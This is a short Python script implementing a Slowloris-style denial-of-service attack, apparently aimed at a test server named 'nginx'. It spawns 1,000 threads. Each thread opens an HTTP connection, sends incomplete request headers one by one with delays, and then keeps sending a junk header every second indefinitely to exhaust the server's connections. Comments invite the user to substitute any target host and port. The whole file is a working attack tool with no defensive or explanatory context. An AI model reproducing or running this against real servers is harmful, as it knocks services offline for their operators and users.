import socket
import time
import threading


# Target server details
target_host = 'nginx'  # Replace with the target server
target_port = 80  # Replace with the target server's port (usually 80 for HTTP)
num_threads = 1000


def run():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to the server
    s.connect((target_host, target_port))
    # Send partial HTTP request headers at slow intervals
    headers = [
        "GET / HTTP/1.1\r\n",
        "Host: " + target_host + "\r\n",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n",
        "Accept-language: en-US,en,q=0.5\r\n",
        "Connection: keep-alive\r\n",
    ]
    for header in headers:
        s.send(header.encode())
        time.sleep(1)  # Adjust the delay as needed
    # Keep sending partial headers slowly
    while True:
        s.send(b"X-a: b\r\n")
        time.sleep(1)  # Adjust the delay as needed


threads = []

for i in range(num_threads):
    thread = threading.Thread(target=run)
    thread.daemon = True
    threads.append(thread)

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
